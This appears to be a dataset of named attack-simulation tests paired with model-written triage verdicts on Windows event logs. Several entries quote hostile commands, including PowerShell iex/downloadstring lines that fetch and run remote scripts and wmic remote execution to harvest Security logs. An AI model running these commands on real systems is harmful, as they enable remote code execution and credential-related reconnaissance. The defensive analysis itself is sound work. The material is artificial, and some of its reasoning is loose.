BIOS Information Discovery through Registry,"Upon analyzing the provided Windows event logs, the primary focus is on identifying any suspicious or anomalous behavior that may indicate malicious activity or a potential security compromise. Here is a breakdown of the key observations:

### **Application Log:**
- The entries primarily involve the stopping of the 'edgeupdate' service, which is a typical behavior for the Microsoft Edge update service. This is normal behavior and does not inherently indicate a security issue.

### **Security Log:**
- The events logged are related to time change events (EventID 4616) by Local Service via svchost.exe. This might be routine system time synchronization activity with external time sources. No immediate suspicious context is associated with these entries.

### **Sysmon Log:**
- **Execution of 'wevtutil.exe' and 'conhost.exe':** These processes are legitimate Windows processes used for event utility commands and console window host, respectively. The frequent execution within short intervals is notable but not inherently malicious as they might relate to legitimate administrative activities.
- **Execution of 'HOSTNAME.EXE', 'whoami.exe' and 'cmd.exe':** These are standard Windows command-line utilities used to obtain network hostname and user information, and run commands. Observing 'cmd.exe' querying registry keys specifically related to BIOS information is slightly unusual but could fall into administrative tasks or system inventory checks.
- **Microsoft Edge Update Activities:** There is extensive activity related to 'Microsoft Edge Update', which involves legitimate update and registration operations. While it may appear verbose, such logging is common during application updates.
  
### **System Log:**
- Similar time-related events and kernel activities were noted, consistent with time synchronization tasks. No adverse behaviors are present here.

### **Conclusion:**
Based on the analysis, there are no definitive indicators of compromise or explicit malicious activity observed in the logs. Most observed activities link back to legitimate system operations, updates, or administrative functions. The logs reflect typical behaviors that are seen during system maintenance and updates. The activities do not currently exhibit signs of privilege escalation, anomalous process execution, or unauthorized network access attempts.

### **Resolution: BENIGN**
- The events observed in the logs indicate benign activities that, while verbose, conform with expected system operations.
- Continuous monitoring and correlation with additional logs or behaviors, if any, are advised to gain further context, especially if new anomalies arise. It is prudent to ensure all security updates and patches are applied to diminish any potential vulnerabilities related to legitimate services and processes logged here."
Packet Capture Windows Command Prompt,"Upon reviewing the provided Windows event logs, several elements stand out that suggest suspicious activity. Here is a detailed analysis of the logs:

### Analysis:

1. **PowerShell Activities**:
   - Multiple instances of `powershell.exe` are running scripts that download and execute binaries from external sources. Specifically, the log entry shows a PowerShell command downloading `wireshark_installer.exe` from an external URL using `Invoke-WebRequest`, then executing it silently with the `/S` switch. This behavior is consistent with tactics often used in malware delivery for stealthily executing payloads without user interaction or visibility.

2. **Process Execution and Command-Line Arguments**:
   - The use of PowerShell to create directories and download executables to a temporary directory is generally suspicious when coupled with automated execution (`Start-Process`) of the downloaded files.
   - The downloaded binary, `wireshark_installer.exe`, is executed with silent installation parameters. Although Wireshark is a legitimate tool, unauthorized and silent installs can be an indicator of compromise if not explicitly sanctioned or scheduled.
   - The execution of `VC_redist.x64.exe`, likely to address dependencies or masquerade activity as a legitimate setup process, is another common tactic used to distract or cloak malicious activities.

3. **Wireshark Installation**:
   - Wireshark, though legitimate, is a network analysis tool that can be used for packet capture and inspection, potentially indicating an attempt to monitor network communications maliciously.

4. **Other Executed Binaries**:
   - Execution of `cmd.exe` with parameters to call `tshark.exe`, another component of Wireshark, is evident. This can be used to capture network data, again indicating potential reconnaissance activities.
   
5. **User Account and Integrity Level**:
   - The activities are being executed under a user account `SERVER002\\admin_test` with High Integrity Level, which suggests administrative privileges. If this account's activities are not expected (or it is a newly-created or modified account), it could indicate an unauthorized user is leveraging administrative access for malicious purposes.

### Assessment:

Based on the analysis, the overall pattern and combination of downloading and executing external binaries using PowerShell scripts, coupled with the use of a potentially inactive or inadvertently privileged user account indicates suspicious activity.

### Resolution:

**SUSPICIOUS** - The logs indicate activities consistent with attempts to download and execute potentially malicious or unauthorized software using administrative privileges. Further investigation is recommended, particularly focusing on:
- Verifying the legitimacy and authorization of the actions executed under the `admin_test` account.
- Checking for any anomalous or unknown scheduled tasks or scripts.
- Reviewing network traffic during the log timeframe for unauthorized access or data exfiltration attempts.
- Assessing any security baselines for deviations or newly introduced applications that might not be sanctioned.

Overall, security teams should conduct an in-depth review of access logs, user activity, and network logs to either confirm malicious intent or clear suspicions based on verified legitimate activities."
WinPwn - PowerSharpPack - Seatbelt,"Based on the provided Windows event logs from different channels (Security, Windows PowerShell, Application, System, and Sysmon), we can perform an analysis to determine if there are indicators of malicious activity.

### Analysis:

1. **Security Log:**
   - The Security logs show a time synchronization event (Event ID 4616). No suspicious security breaches or unauthorized logons are observed in these logs.

2. **Windows PowerShell Log:**
   - Observations reveal the execution of PowerShell via `powershell.exe` with a suspicious command that downloads and executes a PowerShell script from a GitHub URL (`https://raw.githubusercontent.com/script/script/master/scriptBinaries/Invoke-Seatbelt.ps1`). The `Invoke-Seatbelt` command is often used for system reconnaissance and is a common tool in post-exploitation frameworks. 
   - This specific usage of `iex` (Invoke-Expression) combined with web-based PowerShell script download and execution is a red flag. This suggests the execution of potentially unauthorized and harmful scripts.

3. **Application Log:**
   - Logs from Windows Defender indicate the product is in 'ON' state, which suggests no known security issues were detected by it at the logged time. However, this does not rule out unknown threats.
   - The logs showing Edge updates appear to be regular software update processes without discernible anomalous behavior.

4. **System Log:**
   - The logs primarily include routine time and process synchronization events, which appear benign and related to standard system maintenance activities.

5. **Sysmon Log:**
   - The logs reveal typical process creation events with several legitimate processes like `wevtutil.exe`, `conhost.exe`, and others. 
   - A significant event is the execution of `powershell.exe` with a suspicious command related to downloading and executing scripts from a remote location. This corroborates the PowerShell log findings and indicates potential unauthorized activity.

### Conclusion:
The use of PowerShell to download and execute scripts from an external source without further context or permissions is a clear sign of potential malicious activity. Given the common association of such scripts with adversarial operations, these signs should be taken seriously.

**Resolution: MALICIOUS**

### Recommendations:
- **Immediate Investigation:** Perform a deeper inspection of the PowerShell commands and scripts downloaded from GitHub. Determine their intention and potential impact using your organization's threat intelligence resources.
- **Isolation & Quarantine:** Consider isolating the affected host from the network to prevent further data exfiltration or lateral movement.
- **Security Solutions:** Review and enhance endpoint detection solutions to monitor and prevent unauthorized scripting and network activities.
- **User Awareness:** Conduct a security briefing to bring awareness regarding the risks of running audio scripts and potential phishing mechanisms executed via PowerShell or other means. 
- **Incident Response Plan:** Engage your incident response team to conduct a thorough investigation to ascertain if further systems are compromised or vulnerable, and apply necessary remediation actions accordingly.

The identified PowerShell activity justifies treating this as a security incident requiring prompt and comprehensive action."
DNS Server Discovery Using nslookup,"Let's analyze the provided Windows event logs for any signs of suspicious or malicious activity.

### Event Log Analysis

1. **Windows Update Events - System Log:**
   - The logs show events related to ""Security Intelligence Update for Microsoft Defender Antivirus"" with EventIDs 44 and 43. These events indicate successful updates for Microsoft Defender Antivirus, which is normal behavior and expected on a well-maintained system.

2. **Sysmon Events - Process Creation:**
   - Multiple process creation events are logged by Sysmon.
   
   - **Whoami and Hostname Executions:**
     - `whoami.exe` and `hostname.exe` are legitimate Windows utilities, commonly used to display user and system information respectively. 
     - They are executed by a user with high integrity level (`admin_test`), which might be typical if the user or a script is performing routine checks.
     - Parent process for `whoami.exe` is `wsmprovhost.exe`, a Windows process related to Windows Remote Management, suggesting these commands could be part of a remote management or monitoring script.

   - **NSLookup Command:**
     - Execution of `cmd.exe` to run `nslookup` against `_ldap._tcp.dc._msdcs.%USERDNSDOMAIN%` is noteworthy. This command queries DNS server records used for Active Directory domain controllers.
     - While `nslookup` is a legitimate tool, if executed without authorization or in unexpected contexts, it might indicate reconnaissance activity by an attacker or an admin/user checking domain records.

   - **Frequent `wevtutil.exe` Usage:**
     - There are several executions of `wevtutil.exe`, a command-line utility for managing Windows Event logs. This could indicate normal log maintenance, but frequent use could also suggest actions taken to view or clear logs, especially if done outside regular maintenance schedules.

   - **MicrosoftEdgeUpdate and System Processes:**
     - Regular system processes such as `dllhost.exe`, `DeviceCensus.exe`, `MusNotification.exe`, and `svchost.exe` run under `NT AUTHORITY\*` accounts. This is standard behavior for various system and maintenance tasks.

3. **Suspicious Indicators:**
   - No clear immediate indicators of compromise (IOC) like known malicious file hashes, anomalous network connections, suspicious command executions (such as `powershell` with encoded commands), or privilege escalation attempts.
   - The `nslookup` usage, depending on the context, might merit further inspection if there isn’t a known legitimate reason for such a query.
   - Frequent `wevtutil.exe` usage, if non-routine and unexplained, could be a red flag.

### Conclusion

Based on the log entries analyzed, there is no definitive evidence of malicious activity. However, there are some actions worthy of further investigation due to their contextual ambiguity:

- **Resolution: SUSPICIOUS**
  - Investigate the context of the `nslookup` command. Verify if this was executed by an authorized user or script and whether it aligns with expected network or administrative activity.
  - Review the purpose and scope of `wevtutil.exe` invocations. Ensure these align with legitimate log management practices.
  - Consider implementing monitoring to detect unusual command executions or scripts that might indicate deeper reconnaissance or exploitation attempts.

### Recommendations

- Audit user behaviors and scripts that might be executing commands like `nslookup`.
- Ensure logging and monitoring systems are alerting on unusual commands or an increase in log management utilities like `wevtutil`.
- Regularly update threat intelligence to detect emerging IOCs and adapt security baselines accordingly.

Examine local password policy - Windows,"**Analysis of Provided Windows Event Logs**

**1. Contextual Overview:**
The logs provided are from a Windows host ""Server002"" and contain entries from multiple channels including Application, Sysmon, and potentially concerning system operations. The task is to examine these logs for signs of potentially malicious activity on this host.

**2. System and Application Logs:**
- There are several entries related to ""edgeupdate"", specifically indicating service start and stop actions. A service stop is logged twice in quick succession, which could warrant further investigation but is generally not indicative of immediate malicious actions without additional context.
- The Microsoft-Windows-Security-SPP log indicates routine behavior by the Software Protection Platform Service.

**3. Sysmon Log Analysis:**
- **Process Creation (Event ID 1)**: The logs reveal multiple executions of system utilities such as `wevtutil.exe`, `conhost.exe`, `cmd.exe`, and Microsoft Edge update processes. 
  - Frequent use of system utilities like `wevtutil.exe` for event log manipulations can indicate log tampering, but it's used without suspicious command-line parameters.
  - The `cmd.exe` and `net.exe` running services like ""net accounts"" may indicate reconnaissance commands used to probe system configurations, which could be legitimate or a precursor to malicious activity.
  - Multiple instances of the MicrosoftEdgeUpdate setup and service execution are noted, which generally indicates legitimate update actions unless there are signs of anomalous modifications to the files or behavior.
  
- **Command Lines for Misuse**:
  - A command line for `cmd.exe` shows ""/c net accounts"", suggesting querying of account policy settings. Querying account settings can be part of malicious reconnaissance. 
  - The repetitive execution of Microsoft Edge update processes with varied commands indicates legitimate update operations unless associated with unusual behavior.

**4. Behavioral Indicators:**
- The behavior exhibited by `wevtutil.exe` and `cmd.exe` can sometimes be associated with malicious actors attempting to gather information or cover tracks, but no explicit malicious parameters were used in the command lines.
- The Sysmon log entries where `MicrosoftEdgeUpdate.exe` runs with high integrity at the system level is a routine update operation that aligns with normal system administrative tasks.

**5. Conclusion and Resolution:**

**Assessment**:
- The logs primarily show evidence of system events and routine application updates, especially related to Microsoft Edge updates.
- The use of standard system tools (`wevtutil.exe`, `cmd.exe`, and `net.exe`) without additional suspicious indicators reduces the likelihood of malicious intent, though the context of `cmd.exe /c net accounts` should be further verified with relevant user activity logs to rule out unauthorized queries.

**Resolution**: **SUSPICIOUS**

While most of the activity appears to be legitimate system maintenance and application updates, the use of `cmd.exe` to inquire about account settings raises suspicion that warrants further investigation. It’s recommended to review context-specific information such as corresponding user activity, historical actions by the user accounts in question, and ensure that these operations were sanctioned by IT administration or required for legitimate business purposes. Further investigation will confirm or dismiss the benign nature of these logs."
WinPwn - GPOAudit,"After analyzing the provided logs from the Windows host system, several observations and analyses have been made:

### Windows PowerShell Log:
- **Downloads and Execution of Remote Scripts**: The logs show repeated execution of PowerShell commands initiating a download and execution of scripts from `https://raw.githubusercontent.com/script/script/121dcee26a7aca368821563cbe92b2b5638c5773/script.ps1`. This behavior is highly suspicious as it involves downloading and executing scripts from an external source, which is a typical method used by attackers to introduce malicious scripts.
- **Commands and Execution Context**: The PowerShell commands executed (`GPOAudit -noninteractive -consoleoutput`) indicate that a script was run in a non-interactive mode, which could be used to evade detection or minimize user disruption.

### Sysmon Log:
- **Process Creation and Rationale**: Multiple processes related to administrative tasks and utilities such as `wevtutil.exe`, `conhost.exe`, and `whoami.exe` are executed under the user `SERVER002\admin_test`. While these processes are not inherently malicious, their combination with the repeated PowerShell scripting activity raises concerns about their legitimacy.

### Application Log:
- **Security Product State**: The events indicate Windows Defender remains active (SECURITY_PRODUCT_STATE_ON). However, this does not necessarily mean it detected or blocked any issues, which means the malicious script may have bypassed detection.

### Security Log:
- **Time Change Records**: There are time synchronization events, which are normal but can indicate unusual activity if time was changed previously by an attacker to hide log entries.

### System Log:
- **General System Operations**: Events regarding kernel operations and time synchronization mainly indicate normal activity during the provided timeframe.

### Assessment and Conclusion:
The PowerShell log entries showing downloads and execution of remote scripts are a significant indicator of potentially malicious activity. It is uncommon for legitimate operations to execute such scripts from external, non-sanctioned repositories. This behavior is typically observed in advanced persistent threats or compromise scenarios where scripts from external repositories are utilized for furthering attacks.

Given:
- The unmanaged downloading and execution of scripts from an external source.
- The execution of potentially administrative PowerShell scripts without a clear legitimate context.

**Resolution**: **MALICIOUS**

### Guidance on How to Proceed:
1. **Immediate Containment**: Isolate the affected host from the network to prevent further spread or communication with potential command and control infrastructure.
2. **Further Investigation**: Analyze the downloaded script (`script.ps1`) to determine its purpose, behavior, and impact on the system.
3. **Audit and Review**: Check for any changes made in the Group Policy Objects (GPOs) or system settings and audit other systems for similar activity.
4. **Eradication and Recovery**: Clean the system by removing any unauthorized changes or reverse potential damage and ensure that the system configurations are restored to their secure baselines.
5. **Increase Monitoring and Detection**: Enhance network and endpoint monitoring to detect similar behavior in the future. Implement stricter controls over script execution policies and network communications.

Implementing these measures will help in mitigating the risk and reinforcing the defenses against such threats in the future."
WinPwn - DotNet,"### Detailed Analysis

Upon analyzing the provided Windows event logs, several entries require closer scrutiny due to their potential relationship with malicious activity:

#### Windows PowerShell log:
1. **PowerShell Execution**: 
   - A PowerShell script is executed using a command line that involves downloading a script from GitHub and executing it. Specifically:
     - `powershell.exe &amp; {$script_repo='https://...'};iex(new-object net.webclient).downloadstring(...)`
   - This behavior is highly suspicious because it indicates that a script is being fetched from an external source and executed inline without any terminal output, which is common in malicious activities like downloading and running malware.
   - The use of `iex` (Invoke-Expression) is particularly concerning as it might be used to execute potentially harmful code.

#### Security log:
1. **Privileged Access**:
   - The event ID 4672 indicates that the user `admin_test` gained special privileges such as `SeDebugPrivilege`, which are often sought after for malicious purposes like privilege escalation or manipulating system-level processes.
   - There is a logon event (ID 4624) which signifies an NTLM logon session with the same `admin_test` user.
   
#### Sysmon log:
1. **Process Creation**:
   - Several entries show processes like `whoami.exe` and `hostname.exe` running under `SERVER002\admin_test`. Though these are normal system utilities, their rapid invocation can be a feature of a script trying to gather system information.
   - The PowerShell execution entry matches the suspicious PowerShell command line observed in the Windows PowerShell log.

Across all logs, the aggregation of suspicious signs points towards the Windows host being potentially compromised:
- **Downloading & Executing Scripts** from an untrusted source via PowerShell.
- **Escalation of Privileges** through the acquisition of high-level privileges.
- **Potential Exploration or Reconnaissance** using system utilities.

### Assessment
- The PowerShell activities, particularly the script download and execution, raise significant concerns about malware execution. The correlation with other logs indicating privilege escalation and suspicious process activities strengthens this suspicion. 

### Threats/Risks Identified
- **Remote Code Execution**: The execution of code from a remote source suggests an external entity might control or compromise the host.
- **Privilege Escalation**: The presence and use of elevated privileges (SeDebugPrivilege, etc.) can allow for in-depth system manipulation.

### Guidance and Resolution
Considering the observations and given their serious implications, the situation is assessed as **MALICIOUS**. Here are the next steps:
- **Immediate containment**: Isolate the affected host from the network to prevent possible lateral movement or data exfiltration by threat actors.
- **Forensic Analysis**: Collect and analyze memory dumps and network traffic logs for further investigation.
- **Malware Removal & System Restoration**: Clean the system of potential malware using a trusted antivirus solution and consider reverting to a previous clean state from backups.
- **Review External Interactions**: Examine logs for unusual network connections, especially those related to the URLs present in the PowerShell logs.
- **Patch Management & Security Enhancements**: Ensure all systems are up-to-date with patches and implement further security measures, such as enhanced network monitoring, log analysis, and user behavior analytics to detect similar incidents in the future."
Process Discovery - get-wmiObject,"Based on the provided Windows event logs, the following observations can be made:

### System Log
1. **Time Change Events (EventID 24)**
   - Multiple time change events occur, where the system time is set back by a few seconds. Such changes might occur due to time synchronization processes or system disturbances but could also indicate tampering. 
   - The responsible process is `svchost.exe`, which is legitimate, but without context, numerous time corrections in a short period could raise suspicions.

### Sysmon Log
2. **Execution of Legitimate Processes:**
   - Executions of `wevtutil.exe`, `conhost.exe`, `svchost.exe`, `hostname.exe`, `whoami.exe`, and `powershell.exe` are logged. These are commonly legitimate processes related to system management.
   - However, frequent execution and interaction among these at a rapid pace might suggest misconfiguration or scripted activity.

3. **Powershell Execution:**
   - Execution with the command line `get-wmiObject -class Win32_Process` indicates querying WMI for process information.
   - Given the context, such use of PowerShell is common, but frequent or unexpected invocations can imply intent to gather information on running processes potentially for malicious activity.

### Security Log
4. **Successful NTLM Logon (EventID 4624):**
   - The logon events including the user `admin_test` using NTLM authentication from a remote workstation (DESKTOP-3HL5B2P) were noted.
   - While NTLM logons may be normal, repeated or surprising variations in source IPs or workstations could suggest unauthorized access attempts.

5. **Privileges Granted (EventID 4672):**
   - The user `admin_test` receives elevated privileges multiple times in quick succession, encompassing a wide range of high-level permissions.
   - An authorized user may indeed have these privileges, but multiple allocations without a visible purpose may hint at privilege misuse or reconnaissance attempts.

### Application Log
6. **Miscellaneous Events:**
   - Events performed by the `Software Protection Platform Service` seem routine and without enough context, are likely benign.

### Windows PowerShell Log
7. **Provider Start Events (EventID 600):**
   - Indicate typical startup of PowerShell modules. Seeing these logs alone without further action often appears benign, yet actions called from here can range from benign scripting to potential risks depending on context.

### Analysis Summary:
The logs contain a series of legitimate-looking actions, yet their succession and rapid occurrence potentially hint at automated or scripted activities. Notably:
- The repeated time changes might indicate either a legitimate synchronization effort or an attempt at log evasion.
- Frequent PowerShell activity points toward script execution, possibly for environmental reconnaissance.
- The elevation of privileges without typical justifying actions raises concern for potential misuse or an attack in its initial phases.

### Final Resolution: **SUSPICIOUS**
Activity logged can be associated with legitimate administrative actions, but given the rapid and repetitive nature of certain entries, further investigation into the timeline, context, and consistency with expected behaviors for the user `admin_test` and system `Server002` is recommended. Proceed to isolate logs against known operational patterns, user authorization records, and potential network intelligence to ensure these actions align with organizational norms."
System Network Connections Discovery,"Based on the analysis of the provided event logs, here are the key observations and conclusions:

### Suspicious Activities/Anomalies:
1. **Use of Administrative Tools**:
   - There are logs showing execution of the ""whoami.exe,"" ""wevtutil.exe,"" and ""cmd.exe"" tools with high integrity levels by the user ""admin_test"". The usage of these tools can be common for administrative tasks, but they are also often leveraged by attackers during the reconnaissance and execution phases.
   - The command line for `cmd.exe` including the `netstat`, `net use`, and `net sessions` commands might suggest network reconnaissance activities.

2. **Frequent Execution of `conhost.exe`**:
   - There are many instances of `conhost.exe`, which is associated with console operations. While it's not uncommon for `conhost.exe` to be executed multiple times, its numerous occurrences in conjunction with administrative tools might be indicative of batch or automated tasks being executed in a script, which can sometimes point to potentially unwanted activity.

3. **Privilege Escalation**:
   - Security logs indicate a few `4672` events, which represent special privileges assigned to new logins. These indicate that someone logged in with elevated privileges, which is normal for an administrator but should be verified to confirm the actions were expected.

4. **System Utility Execution**:
   - Tools like `wevtutil.exe` used for event logs management and administrative purposes appear frequently. If the context of their usage isn't clear or expected, it can be suspicious.

5. **Anomalous Processes**:
   - The execution of `net.exe`, `net1.exe`, `netstat.exe`, all in a short span, and the presence of `cmd.exe` running commands for network configuration and status could indicate an attempt to enumerate network details.

### Benign Activities:
1. **Microsoft Edge Updates**:
   - Entries related to Microsoft Edge update processes seem benign and consistent with typical software updating processes—no irregularities are flagged.

2. **Service Processes (e.g., `sppsvc.exe`, `TiWorker.exe`)**:
   - These processes are indicative of system maintenance activities related to software protection and Windows updates which are normal background operations.

### Conclusion and Assessment:
- **Resolution: SUSPICIOUS**

The presence of administrative commands and frequent use of utilities integrated into automated scripts or tasks raise questions about potential unauthorized or unexpected administrative activity. While there's no definitive evidence of malware or direct compromise, the activity could be indicative of potentially unwanted automated scripts or reconnaissance efforts.

### Recommendations:
1. **Verification of User Actions**: Confirm whether the `admin_test` account activity aligns with the expected administrative tasks. If uncertain, consider further monitoring or investigation into recent actions by this account.
   
2. **Audit Actual User Activity**: Review and corroborate these logs against actual user requests and activities, especially those related to network enumeration tools.

3. **Assess Privilege Use**: Ensure that all elevated privileges observed were intended and authorized.

4. **Enhance Monitoring**: Increase the scrutiny on activities involving administrative tools and privilege usage to catch similar activities earlier.

5. **Network Activity Review**: Conduct network traffic analysis to understand any outbound connections initiated after the reconnaissance commands.

Further investigation should focus on confirming or excluding these events as legitimate administrative actions or potential security risks."
WinPwn - General privesc checks,"### Analysis of Logs:

#### **Windows PowerShell Logs:**
1. **Suspicious PowerShell Execution:**
   - Logs indicate a PowerShell execution using the command line: `powershell.exe & {$script_repo='https://raw.githubusercontent.com/script', iex(new-object net.webclient).downloadstring('https://raw.githubusercontent.com/script/script/121dcee26a7aca368821563cbe92b2b5638c5773/script.ps1'), otherchecks -noninteractive -consoleoutput}`
   - This indicates an attempt to download and execute a script from GitHub, which is a well-known method for executing potentially malicious scripts or payloads.

#### **Application Logs:**
1. **Windows Defender Activity:**
   - Indicates that Windows Defender is active and running with `SECURITY_PRODUCT_STATE_ON`. This suggests that the script execution may have bypassed or not been detected by Windows Defender at the time of execution.

2. **EdgeUpdate Activity:**
   - Normal update activity logged for Microsoft Edge. There is no indication of attempted modifications or connections to suspicious domains.

#### **Sysmon Logs:**
1. **Process Creations:**
   - Multiple legitimate system utilities (`wevtutil.exe`, `conhost.exe`, `whoami.exe`, etc.) are executed by the user `SERVER002\\admin_test`. 
   - These executions are not inherently suspicious without additional context indicating misuse.
   
2. **PowerShell Process:**
   - Confirms the PowerShell process with the suspicious command. The command aligns with the PowerShell log entry and further corroborates potentially harmful activity.

#### **Security Logs:**
1. **Time Change Events:**
   - Time synchronization events indicating adjustment with `time.windows.com`. These are generally benign and routine for correcting system clocks.

#### **System Logs:**
1. **Time Zone Adjustments:**
   - Similar to security logs, adjustments to the system time zone settings are present. These do not indicate malicious activity.

### **Assessment:**
The logs provide evidence of potentially malicious activity due to the PowerShell command downloading and executing a script from an external source. This behavior is highly indicative of malpractice, as attackers commonly use PowerShell for executing payloads from remote locations.

### **Resolution: MALICIOUS**

### **Guidance and Next Steps:**
1. **Immediate Action:**
   - Terminate any suspicious processes, especially those running the identified PowerShell script.
   - Isolate the affected system from the network to prevent any potential lateral movement or data exfiltration.

2. **Investigation:**
   - Analyze the script from the URL for any malicious behavior or payload.
   - Review Windows Defender logs for any detection discrepancies or disablements around the timestamps of execution.

3. **Further Mitigation:**
   - Conduct a comprehensive threat hunting exercise across other network systems.
   - Reinforce endpoint protection mechanisms and consider behavioral analysis tools for script execution monitoring.

4. **Post-incident Review:**
   - Assess the need for user training regarding recognition of malicious attempts and best practices for script execution.
   - Review and update security policies to restrict PowerShell usage unless explicitly authorized."
Adfind - Enumerate Active Directory User Objects,"Upon reviewing the provided event logs from the Windows host ""Server002,"" several observations and analyses can be made:

1. **Command Line Execution:**
   - The execution of `cmd.exe` with the command `AdFind.exe` is noteworthy. AdFind is a legitimate tool used for querying Active Directory, but it is frequently used by attackers for reconnaissance purposes in an Active Directory environment. The command `AdFind.exe -f (objectcategory=person)` suggests a query targeting objects categorized as persons.
   
2. **Event Log Analysis:**
   - **Sysmon Logs:** They showed a series of processes initiated by the user `SERVER002\admin_test`, such as `whoami.exe`, `HOSTNAME.EXE`, `wevtutil.exe`, and multiple `cmd.exe` executions. While individual execution of commands like `whoami.exe` or `hostname.exe` are typical, the sequence and combination with tools like AdFind may be atypical.
   - **Microsoft Edge Update Processes:** There are multiple events related to Microsoft Edge Update processes. While many of these appear legitimate as part of the software update process, the presence of these events contributes noise and could be leveraged in a compromised system for persistence.

3. **Privilege and System Integrity:**
   - **Security Logs:** Event ID 4672 indicates the assignment of special privileges to the SYSTEM user. This is inherently a part of regular operations but needs to be monitored in context to repeated execution with high privileges.

4. **Security Checks:**
   - **Windows Defender Logs:** Indicate Windows Defender is enabled and running. However, the concurrent use of potentially offensive tools like AdFind could suggest a gap in comprehensive detection.

### Assessment

- **AdFind Usage:** The execution of a potentially malicious command (i.e., AdFind) during administrative or scripted processes warrants a closer investigation.
- **Lateral Movement Indicators:** Use of tools commonly associated with reconnaissance and lateral movement should be contextually validated, especially in high-integrity environments.
- **Edge Update Activity:** While the Edge Update service activities themselves might be legitimate, they could serve as a distraction or be part of a disguised operation if any misbehaving processes were embedded within.

### Resolution

**Resolution: SUSPICIOUS**

Given the identified combination of process executions and the nature of the command used with AdFind, the activities cannot be definitively declared as malicious without further investigation. However, the commands and tools used are consistent with tactics employed by attackers in reconnaissance and information gathering stages. Therefore:

- Investigate the origin and intent behind the execution of `AdFind`.
- Conduct user activity reviews and assess the `admin_test` user privileges.
- Validate the processes associated with the Edge update to ensure there are no anomalies or signs of compromise.
- Consider conducting a comprehensive threat hunt across related systems to identify potential lateral movement tactics."
Wevtutil - Discover NTLM Users Remote,"Upon reviewing the logs, several points of interest stand out that might indicate suspicious or malicious activity:

1. **PowerShell Activities**:
   - The PowerShell logs show that a script was executed with a command line invoking `powershell.exe` to resolve the logon server's IP address and to create a process remotely via `wmic.exe`. This script is extracting security logs (`wevtutil epl Security`) and appears to be filtering for Event ID 4776 (an event associated with NTLM authentication).
   - The command line being used in PowerShell appears to be gathering IPs and then launching `wmic.exe` on those IPs, which is then used to create processes for event log extraction. This behavior is unusual and potentially indicative of lateral movement or reconnaissance within the network.

2. **Sysmon Events**:
   - Frequent spawning of processes like `wevtutil.exe` and usage of `wmic.exe` tied to PowerShell sessions. This aligns with the PowerShell activity mentioned above and reinforces the idea of extracting event logs surreptitiously.
   - The use of `whoami.exe` by the user `SERVER002\\admin_test` multiple times could indicate privilege checks or reconnaissance.

3. **Security Concerns**:
   - The script's focus on Event ID 4776 (NTLM authentication) suggests credentials might be a target for this activity.
   - The processes are executed with high integrity levels, indicating potentially elevated permissions. The use of `wmic.exe` to execute commands on remote systems and log harvesting is a tactic often used in lateral movement and exfiltration scenarios.

Based on these observations, the activities logged are beyond standard system operations, lean towards credential access and reconnaissance, and could be part of a compromise or lateral movement attempt. Therefore, the resolution should be:

**Resolution: MALICIOUS**

**Guidance**:
- Initiate an incident response procedure immediately to contain and mitigate potential threats.
- Investigate the source and actions of the user `admin_test` to determine if the actions were authorized or compromised.
- Analyze network traffic logs for further signs of suspicious activities or data exfiltration.
- Ensure endpoint protection solutions are in place and updated to possibly prevent or detect similar activities.
- Consider resetting potentially compromised credentials, especially if there are indications of unauthorized NTLM authentication attempts."
List Mozilla Firefox bookmarks on Windows with command prompt,"Upon reviewing the provided series of Windows event logs, I have identified several activities that stand out and warrant closer examination:

1. **Frequent Execution of System Utilities by 'admin_test':**
   - From the Sysmon logs, there is frequent execution of commands like `hostname.exe`, `whoami.exe`, and `cmd.exe` by the user `admin_test`. While these commands are legitimate and commonly used for system administration, their frequent occurrence within a short timespan can be indicative of either a misconfigured script or an adversary gathering information on the system.

2. **MicrosoftEdgeUpdate.exe Activities:**
   - There are multiple entries involving `MicrosoftEdgeUpdate.exe`. This executable forms part of Microsoft Edge’s update mechanism and typically runs with system privileges. However, its execution pattern should be understood in the context of the system’s usual behavior. If Microsoft Edge updates are scheduled to run at this time, this may be benign. Nevertheless, the recurrence of this action without context could hint at a potential exploitation attempt leveraging this system service.

3. **Execution of `conhost.exe`:**
   - The presence of `conhost.exe` alongside commands like `cmd.exe` suggests a command-line interface usage that should be expected but can also manifest in some types of malicious activity or automation scripts.

4. **Sppsvc.exe Activity:**
   - `sppsvc.exe` is related to the Microsoft Software Protection Platform service managing digital licenses. The presence of this service in the logs at the timestamps provided does not suggest any direct anomalous activity, but services being started and stopped can be a tactic used by malware trying to reset a software protection mechanism.

5. **Multiple Sysmon Process Creation Events:**
   - There are numerous entries for legitimate processes initiated by the SYSTEM user. While not inherently indicative of compromise, this should be analyzed in the context of normal system behavior patterns. Unusual patterns may point towards sophisticated malware leveraging system services to mask its activities.

In conclusion, the activities observed in these logs contain legitimate system utilities and Edge update service processes. However, the execution pattern, frequency, and the context of the user's actions suggest inconsistencies compared to typical benign behavior.

**Resolution: SUSPICIOUS**

- **Threat Assessment:** The activities captured within these logs show signs that are often associated with system reconnaissance and potential exploitation but are not definitively indicative of malicious activity without further context or correlating evidence.
- **Recommended Next Steps:** 
  - Conduct a thorough analysis of historical logs on this host to determine if such activities are consistent with normal usage or newly emergent.
  - Investigate `admin_test` workflow and whether recent changes (scripts or automation tasks) could explain these activities.
  - If any updates or changes occurred recently on the system, confirm whether these logs align with scheduled tasks or maintenance activities.
  - Monitor for escalation or lateral movement and verify security configurations, including sufficient logging and real-time security measures."
Kerbrute - userenum,"Based on the analysis of the provided Windows event logs, the following observations have been made:

1. **Suspicious PowerShell Activity**: 
   - Several `powershell.exe` processes are being executed by `SERVER002\admin_test`, with one instance executing a script (`script.exe`) from a temporary directory (`C:\\Users\\ADMIN_~1\\AppData\\Local\\Temp\\file\\..\\Externalfiles`). This includes activity such as user enumeration and domain controller interactions, which are common indicators of reconnaissance efforts often associated with malicious activity.
   - The command line used is obfuscated, making it difficult to directly ascertain intent but the use of enumerations and interactions with the domain controller suggests potential lateral movement or enumeration activities.

2. **Wevtutil Executions**: 
   - The frequent execution of `wevtutil.exe`, a tool used for managing and querying event logs, could suggest attempts to either access events without using standard tools or to clear or tamper with event logs to cover tracks.

3. **Prevalence of Conhost.exe Instances**:
   - Numerous `conhost.exe` instances paired with different command-line utilities typically indicate shell spawning for command execution control. While not inherently malicious, frequent execution disproportionately with the logs reinforces a need for further inspection especially when linked to suspicious parent activities such as PowerShell in this context.

4. **High Integrity Levels**:
   - Several processes executed by the user `SERVER002\admin_test` operate with high integrity levels. This includes some PowerShell instances, indicating administrative-level execution, which could facilitate privilege escalation attacks.

5. **General System Processes**: 
